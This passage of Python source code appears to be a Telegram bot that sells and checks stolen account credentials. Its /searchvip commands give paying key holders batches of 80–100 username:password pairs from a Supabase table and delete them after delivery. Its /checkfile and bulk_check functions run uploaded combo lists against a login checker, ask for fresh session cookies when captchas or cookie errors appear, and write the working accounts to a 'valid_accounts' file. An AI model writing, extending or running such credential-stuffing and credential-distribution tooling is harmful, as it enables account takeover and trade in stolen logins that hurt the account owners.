        del_response = requests.delete(
            f"{SUPABASE_URL}/rest/v1/entries?username=eq.{username}&pass=eq.{password}",
            headers=SUPABASE_HEADERS
        )
        if del_response.status_code not in [200, 204]:
            print(f"Failed to delete {username}:{password} - {del_response.status_code} {del_response.text}")

    os.remove(result_file)
    update_vip_usage_v2(user_id, "last_used_vip1")
    await searching_msg.edit_text("✅ VIP1 search completed!")


@app.on_message(filters.command("searchvip2"))
async def search_vip2(client, message):
    user_id = message.from_user.id
    can_use, error_message = can_use_vip_v2(user_id, "last_used_vip2")
    if not can_use:
        await message.reply(error_message)
        return

    searching_msg = await message.reply("🔍 Searching Supabase for VIP2 results...")

    response = requests.get(
        f"{SUPABASE_URL}/rest/v1/entries?category=eq.vip2&select=username,pass",
        headers=SUPABASE_HEADERS
    )

    if response.status_code != 200:
        await searching_msg.edit_text("❌ Error fetching from Supabase.")
        return

    data = response.json()
    valid_rows = [row for row in data if row["username"] and row["pass"]]

    if len(valid_rows) < 80:
        await searching_msg.edit_text("❌ Not enough accounts found (less than 80). Please try again later.")
        return

    results = [f"{row['username']}:{row['pass']}" for row in valid_rows]

    sampled_results = random.sample(results, random.randint(80, 100))

    result_file = "vip2_results.txt"
    with open(result_file, "w", encoding="utf-8") as file:
        file.write("\n".join(sampled_results))

    await message.reply_document(result_file, caption="📄 **VIP2 Results**")

    for entry in sampled_results:
        username, password = entry.split(":", 1)
        del_response = requests.delete(
            f"{SUPABASE_URL}/rest/v1/entries?username=eq.{username}&pass=eq.{password}",
            headers=SUPABASE_HEADERS
        )
        if del_response.status_code not in [200, 204]:
            print(f"Failed to delete {username}:{password} - {del_response.status_code} {del_response.text}")

    os.remove(result_file)
    update_vip_usage_v2(user_id, "last_used_vip2")
    await searching_msg.edit_text("✅ VIP2 search completed!")

user_pending_files = {}
pending_cookie_users = set()
cookie_retry_counts = defaultdict(int)
cookie_cooldowns = {}

# Helper function to validate VIP access
def has_vip_access(user_id):
    response = requests.get(f"{SUPABASE_URL}/rest/v1/keys?redeemed_by=eq.{user_id}", headers=SUPABASE_HEADERS)
    if response.status_code != 200:
        return False
    data = response.json()
    if not data:
        return False
    expiry_str = data[0].get("expiry")
    if not expiry_str:
        return False
    expiry_date = datetime.fromisoformat(expiry_str)
    return (expiry_date - datetime.now(timezone.utc)).days > 7

# Function to check if user can use VIP command
def can_use_vip(user_id):
    if user_id == ADMIN_ID:
        return True, None
    if not has_vip_access(user_id):
        return False, "\ud83d\udeab You need to avail a lifetime key to use this command!"
    return True, None

# Save file to download location
async def save_file(message):
    file_message = message.reply_to_message if message.reply_to_message and message.reply_to_message.document else message if message.document else None
    if not file_message:
        return None, "\ud83d\udeab Please send or reply to a file."
    os.makedirs("downloads", exist_ok=True)
    file_path = f"downloads/{file_message.document.file_name}"
    await file_message.download(file_path)
    return file_path, None

@app.on_message(filters.command("checkfile"))
async def check_file(client, message):
    user_id = message.from_user.id

    if user_id in cookie_cooldowns and (remaining := int(cookie_cooldowns[user_id] - time.time())) > 0:
        await message.reply(f"\u23f3 You're on cooldown due to too many failed cookie retries. Please wait {remaining // 60}m {remaining % 60}s.")
        return
    elif user_id in cookie_cooldowns:
        del cookie_cooldowns[user_id]
        cookie_retry_counts[user_id] = 0

    can_use, error_message = can_use_vip(user_id)
    if not can_use:
        await message.reply(error_message)
        return

    if not os.path.exists(COOKIE_FILE):
        file_path, error = await save_file(message)
        if error:
            await message.reply(error)
            return
        user_pending_files[user_id] = file_path
        pending_cookie_users.add(user_id)
        await message.reply("\ud83c\udf5a Please send your cookies using `/sendcookies key=value; key2=value2`")
        return

    file_path, error = await save_file(message)
    if error:
        await message.reply(error)
        return

    await message.reply("\ud83d\udd0d Running bulk check...")
    cookies = main.get_cookies()
    await bulk_check(file_path, cookies, message)

@app.on_message(filters.command("sendcookies"))
async def receive_cookies(client, message):
    user_id = message.from_user.id

    if user_id not in pending_cookie_users:
        await message.reply("\u2139\ufe0f No cookie request pending. Use /checkfile first.")
        return

    parts = message.text.split(" ", 1)
    if len(parts) < 2 or '=' not in parts[1]:
        await message.reply("\u274c Please include cookies in the format: `key=value; key2=value2`")
        return

    cookie_str = parts[1].strip()
    cookies = {k.strip(): v.strip() for k, v in (i.split('=', 1) for i in cookie_str.split('; ') if '=' in i)}

    if not main.validate_cookies(cookies):
        await message.reply("\u274c Invalid cookies. Please enter a valid cookie.")
        user_pending_files.pop(user_id, None)
        pending_cookie_users.discard(user_id)
        return

    main.save_cookies(cookies)
    pending_cookie_users.discard(user_id)
    await message.reply("\u2705 Cookies saved successfully!")

    if user_id in user_pending_files:
        file_path = user_pending_files.pop(user_id)
        await message.reply("\ud83d\udd0d Running bulk check now...")
        await bulk_check(file_path, cookies, message)

# Function for bulk checking accounts
async def bulk_check(file_path, cookies, message):
    import time  # ensure this is imported at the top

    user_id = message.from_user.id
    date = main.get_datenow()
    successful_count = failed_count = 0

    if not file_path.endswith('.txt'):
        await message.reply("\u274c Error: Provided file is not a .txt file.")
        return

    output_dir = "output"
    os.makedirs(output_dir, exist_ok=True)
    failed_file = os.path.join(output_dir, f"failed_{date}.txt")
    success_file = os.path.join(output_dir, f"valid_accounts_{date}.txt")

    with open(file_path, 'r', encoding='utf-8') as infile, \
         open(failed_file, 'a', encoding='utf-8') as fail_out, \
         open(success_file, 'a', encoding='utf-8') as success_out:

        accounts = infile.readlines()
        await message.reply(f"\ud83d\udccc Loaded {len(accounts)} accounts for checking.")

        # Get the start index from the pending files (if retrying)
        start_index = user_pending_files.get(user_id, 0)

        for i in range(start_index, len(accounts)):
            acc = accounts[i].strip()
            if ':' not in acc:
                failed_count += 1
                fail_out.write(f"{acc} - Invalid format\n")
                await message.reply(f"\u274c {acc} - Invalid format")
                continue

            username, password = acc.rsplit(':', 1)
            sys.stdin = io.StringIO("\n")
            result = await asyncio.to_thread(main.check_account, username, password, date)
            clean = main.strip_ansi_codes_jarell(result)
            print(f"[DEBUG] Result: {clean}")  # Helpful debug log

            if "CAPTCHA" in clean.upper() or "COOKIE" in clean.upper():
                cookie_retry_counts[user_id] += 1

                if cookie_retry_counts[user_id] > 3:
                    cooldown = 15 * 60
                    cookie_cooldowns[user_id] = time.time() + cooldown
                    msg = await message.reply("\u274c Maximum retries reached. Try again in 15-20 minutes.")
                    for i in range(15):
                        await asyncio.sleep(1)
                        bar = "#" * (29 - i) + "-" * (i + 1)
                        await msg.edit(f"\u23f3 Stopping check in... [{bar}] {15 - i - 1}s")
                    break

                user_pending_files[user_id] = i  # Store the current index
                pending_cookie_users.add(user_id)

                msg = await message.reply("Too much... Please resend a new cookie using `/sendcookies` within 30 seconds...\n\nProgress: [------------------------------] 30s")
                for i in range(30):
                    await asyncio.sleep(1)
                    if user_id not in pending_cookie_users:
                        cookies = main.get_cookies()
                        break
                    bar = "-" * (29 - i) + "#" * (i + 1)
                    await msg.edit(f"Too much... Please resend a new cookie using `/sendcookies` within 30 seconds...\n\nProgress: [{bar}] {30 - i - 1}s")
                else:
                    await msg.edit("\u23f3 Cookie not received in time. Stopping check.")
                break

            elif "[+]" in clean:
                successful_count += 1
                success_out.write(f"{username}:{password} - valid\n")
                await message.reply(clean)
            else:
                failed_count += 1
                fail_out.write(f"{username}:{password} - {clean}\n")
                await message.reply(f"\u274c {username}:{password} - {clean}")

    await message.reply(
        f"\ud83d\udcca **Bulk Check Summary:**\n"
        f"\ud83d\udccc Total: {len(accounts)}\n"
        f"\u2705 Success: {successful_count}\n"
        f"\u274c Failed: {failed_count}"
    )

app.run()
